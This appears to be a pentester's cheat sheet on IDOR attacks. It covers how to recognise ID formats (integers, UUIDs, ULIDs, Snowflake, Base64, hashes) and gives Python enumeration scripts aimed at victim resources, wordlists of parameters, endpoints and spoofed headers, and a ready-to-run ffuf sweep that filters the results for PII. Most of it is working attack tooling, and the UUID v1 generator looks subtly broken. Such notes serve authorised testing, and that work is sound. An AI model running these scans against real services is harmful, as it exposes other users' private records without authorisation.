---
tags: [bac, payloads, idor, wordlist, id-analysis]
type: payloads
date: 2026-03-10
---

# 💣 IDOR Payloads & ID Analysis — v2

> Not just wordlists — techniques for understanding and attacking every ID format you'll encounter.

---

## ID Format Recognition & Attack Map

Before fuzzing, identify what kind of ID you're dealing with. Each format has a specific attack path.

```
Sample ID              → Format              → Attack
────────────────────────────────────────────────────────────────────────
1337                   → Sequential integer  → Enumerate ±N, fuzz range
ACC-2024-00123         → Structured string   → Increment counter part
dXNlcl8xMzM3          → Base64              → Decode → modify → re-encode
5f4dcc3b5aa765d61d...  → MD5 (32 hex chars) → Compute MD5 of target value
3f6a92b1-4c8d-4e2a...  → UUID v4 (random)   → Leak from other endpoints
01J2K3M4P5Q6R7S8T9     → ULID               → Decode timestamp → enumerate
1234567890123456789    → Snowflake ID        → Extract timestamp → enumerate
eyJpZCI6MX0...         → Base64 JSON        → Decode → modify field → re-encode
```

---

## Sequential Integer IDs

```
Probe values:
1          0         -1
2          100       999
1000       1001      9999
10000      99999     1000000

Admin user IDs (often low integers):
1  2  3  admin  root  system  administrator

Quick range fuzz with ffuf:
seq 1 10000 > ids.txt
ffuf -u https://target.com/api/orders/FUZZ \
  -H "Authorization: Bearer TOKEN" \
  -w ids.txt -mc 200 -fs 50 -t 20
```

---

## UUID / GUID Analysis

UUID v4 is random — you cannot predict them. But they leak from the application constantly.

**Where UUIDs leak:**
```
✓ Email confirmation links (?token=UUID, /verify/UUID)
✓ Password reset URLs (/reset/UUID)
✓ Other API responses (nested objects: {"created_by": {"id": "UUID"}})
✓ Webhook payloads
✓ Exported CSV / PDF reports
✓ Shared resource links
✓ Browser history / Referer headers
✓ Error messages ("UUID not found for user UUID")
✓ RSS feeds, sitemaps
✓ GraphQL responses (related object IDs)
```

**UUID v1 — time-based (can be predicted):**
```python
#!/usr/bin/env python3
"""
UUID v1 contains a 60-bit timestamp (100ns intervals since 1582-10-15).
If you have a sample UUID v1, you can reconstruct timestamps near it
and generate candidate UUIDs for other users created around the same time.
"""
import uuid, datetime

def analyze_uuid_v1(uuid_str):
    u = uuid.UUID(uuid_str)
    if u.version != 1:
        print("Not a v1 UUID")
        return
    # Convert to Unix timestamp
    # UUID epoch: Oct 15, 1582 = -12219292800 seconds from Unix epoch
    ts_unix = (u.time - 0x01b21dd213814000) / 1e7
    dt = datetime.datetime.utcfromtimestamp(ts_unix)
    print(f"UUID v1 timestamp: {dt.isoformat()}Z")
    print(f"Clock seq: {u.clock_seq}")
    print(f"Node (MAC-derived): {hex(u.node)}")

# If two users registered within seconds of each other, their UUID v1s
# will have adjacent timestamps. Enumerate by incrementing the timestamp field.
def enumerate_near(uuid_str, delta_seconds=60, steps=1000):
    u = uuid.UUID(uuid_str)
    base_time = u.time
    delta_ticks = int(delta_seconds * 1e7)
    for i in range(-steps, steps):
        new_time = base_time + i * (delta_ticks // steps)
        # Reconstruct UUID with same clock_seq and node
        candidate = uuid.UUID(
            int=(new_time & 0x0FFFFFFFFFFFFFFF) |
                ((u.clock_seq_hi_variant & 0x3F) << 56) |  # simplified
                (u.node),
            version=1
        )
        print(candidate)

analyze_uuid_v1("3f6a92b1-4c8d-11ee-be56-0242ac120002")
```

---

## ULID — Universally Unique Lexicographically Sortable Identifier

ULIDs look like `01J2K3M4P5Q6R7S8T9UVWXY0AB`. The first 10 characters encode a **millisecond-precision Unix timestamp**. This means all ULIDs created within the same millisecond are adjacent in sort order — and brute-forceable by timestamp.

```python
#!/usr/bin/env python3
"""
Decode a ULID and extract its timestamp.
Then enumerate ULIDs created in a time window (e.g., when you know
a victim account was created — from email headers, profile timestamps, etc.)
"""
# pip install python-ulid
from ulid import ULID
import datetime

def decode_ulid(ulid_str):
    u = ULID.from_str(ulid_str)
    print(f"Timestamp: {u.timestamp().datetime.isoformat()}Z")
    print(f"Milliseconds: {u.milliseconds}")
    return u

def enumerate_ulids_in_window(sample_ulid_str, window_ms=5000):
    """
    Generate all ULIDs in a ±window_ms millisecond window.
    Use when you know approximately when a victim's resource was created.
    """
    u = ULID.from_str(sample_ulid_str)
    base_ms = u.milliseconds
    candidates = []
    for ms in range(base_ms - window_ms, base_ms + window_ms):
        # Create a ULID with this timestamp and zero random part
        candidate = ULID.from_timestamp(ms / 1000.0)
        candidates.append(str(candidate))
    return candidates

# Usage: if victim account created at known time:
# candidates = enumerate_ulids_in_window("01J2K3M4P5Q6R7S8T9UVWXY0AB", 10000)
# Feed candidates to ffuf or idor_scan.py
```

---

## Snowflake IDs — Timestamp-Encoded Large Integers

Twitter, Discord, Instagram, and many other high-scale platforms use Snowflake IDs. A Snowflake ID is a **64-bit integer** where the top 41 bits encode a millisecond-precision timestamp since a custom epoch.

```
Snowflake structure:
  Bits  1:  unused (0)
  Bits  2–42: timestamp (ms since custom epoch) ← enumerate this
  Bits 43–52: machine/datacenter ID
  Bits 53–64: sequence number (resets per ms)

Example: 1623773017000000000
```

```python
#!/usr/bin/env python3
"""
Snowflake ID timestamp extractor + enumerator.
Custom epoch varies by platform — common values below.
"""

# Custom epochs (milliseconds since Unix epoch):
EPOCHS = {
    "twitter":  1288834974657,   # Nov 4, 2010
    "discord":  1420070400000,   # Jan 1, 2015
    "instagram": 1314220021721,  # Aug 25, 2011
    "generic":   0,              # Unix epoch (ms)
}

def decode_snowflake(sf_id, platform="twitter"):
    epoch = EPOCHS.get(platform, EPOCHS["twitter"])
    sf = int(sf_id)
    ts_ms = (sf >> 22) + epoch
    machine = (sf & 0x3FF000) >> 12
    seq = sf & 0xFFF
    import datetime
    dt = datetime.datetime.utcfromtimestamp(ts_ms / 1000.0)
    print(f"Platform epoch: {platform} ({epoch})")
    print(f"Timestamp: {dt.isoformat()}Z ({ts_ms}ms)")
    print(f"Machine ID: {machine}, Sequence: {seq}")
    return ts_ms

def snowflake_for_timestamp(ts_ms, epoch_ms, machine=0, seq=0):
    """Generate the Snowflake ID for a specific millisecond."""
    return ((ts_ms - epoch_ms) << 22) | (machine << 12) | seq

def enumerate_window(known_id, platform="twitter", window_seconds=60):
    """Get Snowflake ID range for a ±window_seconds window around known_id."""
    epoch = EPOCHS[platform]
    ts_ms = (int(known_id) >> 22) + epoch
    lo = snowflake_for_timestamp(ts_ms - window_seconds * 1000, epoch)
    hi = snowflake_for_timestamp(ts_ms + window_seconds * 1000, epoch, seq=4095)
    print(f"Enumerate Snowflake IDs from {lo} to {hi}")
    print(f"That's ~{(hi - lo) >> 22} distinct milliseconds")
    return lo, hi

# Example:
decode_snowflake("1623773017000000000", "twitter")
# Then enumerate: if you know victim joined in Jan 2024, 
# generate all IDs for that month and probe them
```

---

## Base64-Encoded IDs

```python
import base64, json

# Simple string IDs:
encoded = "dXNlcl8xMzM3"
decoded = base64.b64decode(encoded + "==").decode()  # "user_1337"
modified = decoded.replace("1337", "1338")
new_encoded = base64.b64encode(modified.encode()).rstrip(b"=").decode()

# JSON-encoded IDs:
encoded = "eyJpZCI6MX0"
decoded = json.loads(base64.b64decode(encoded + "=="))  # {"id": 1}
decoded["id"] = 2
new_encoded = base64.b64encode(json.dumps(decoded, separators=(",",":")).encode()).rstrip(b"=").decode()

# Common prefixes to try when reconstructing:
PREFIXES = ["user_", "usr_", "account_", "acc_", "order_", "inv_",
            "doc_", "file_", "msg_", "report_", "project_"]
for prefix in PREFIXES:
    for i in range(1, 200):
        val = base64.b64encode(f"{prefix}{i}".encode()).rstrip(b"=").decode()
        print(val)
```

---

## Hash-Based IDs (MD5/SHA1)

```python
import hashlib

target_files = [
    "invoice_1337.pdf", "report_admin.pdf", "contract_2024.pdf",
    "user_1338_export.csv", "backup_2024-01-01.sql",
    "config.json", "secrets.env"
]

for f in target_files:
    print(f"MD5:  {hashlib.md5(f.encode()).hexdigest()}  ← {f}")
    print(f"SHA1: {hashlib.sha1(f.encode()).hexdigest()}  ← {f}")

# Also try hashing numeric IDs:
for i in range(1, 100):
    print(hashlib.md5(str(i).encode()).hexdigest())
```

---

## Parameter Names to Test

```
id              user_id         userId
account_id      accountId       customer_id
order_id        orderId         invoice_id
document_id     file_id         fileId
record_id       resource_id     object_id
profile_id      session_id      token_id
uid             pid             rid
oid             ref             reference
target          owner           owner_id
ownerId         report_id       project_id
workspace_id    org_id          tenant_id
```

## API Endpoint Patterns for Fuzzing

```
/api/users/FUZZ                    /api/user/FUZZ
/api/accounts/FUZZ                 /api/orders/FUZZ
/api/orders/FUZZ/details           /api/invoices/FUZZ
/api/documents/FUZZ                /api/files/FUZZ
/api/messages/FUZZ                 /api/payments/FUZZ
/api/reports/FUZZ                  /api/subscriptions/FUZZ
/users/FUZZ/profile                /users/FUZZ/settings
/users/FUZZ/export                 /users/FUZZ/api-key
/users/FUZZ/reset-password         /orgs/FUZZ/members
/workspaces/FUZZ/data              /tenants/FUZZ/users
```

## IDOR via HTTP Headers

```
X-User-Id: VICTIM_ID
X-Account-Id: VICTIM_ID
X-Customer-Id: VICTIM_ID
X-Owner-Id: VICTIM_ID
X-Resource-Id: VICTIM_ID
X-Session-User: VICTIM_ID
X-Tenant-Id: VICTIM_TENANT
X-Org-Id: VICTIM_ORG
X-Workspace-Id: VICTIM_WS
```

---

## ffuf IDOR Scan — Ready to Run

```bash
# Generate integer IDs:
seq 1 10000 > /tmp/ids.txt

# Run with rate limiting (safe for programs):
ffuf -u https://TARGET.com/api/orders/FUZZ \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Accept: application/json" \
  -w /tmp/ids.txt \
  -mc 200 \
  -fc 403,401,404,400 \
  -fs 50 \
  -rate 20 \
  -o idor_results.json \
  -of json

# Filter results for PII:
cat idor_results.json | jq '.results[] | select(.length > 200)' | \
  jq -r '.url'
```

---

## 🔗 Related Notes
- [[IDOR]] | [[IDOR-Techniques]] | [[Bypass-Payloads]]
- [[Custom-Scripts]] | [[Autorize-Plugin]]
- [[gRPC-BAC]] | [[GraphQL-BAC]]

---
*Tags: #payloads #idor #bac #wordlist #id-analysis · v2*
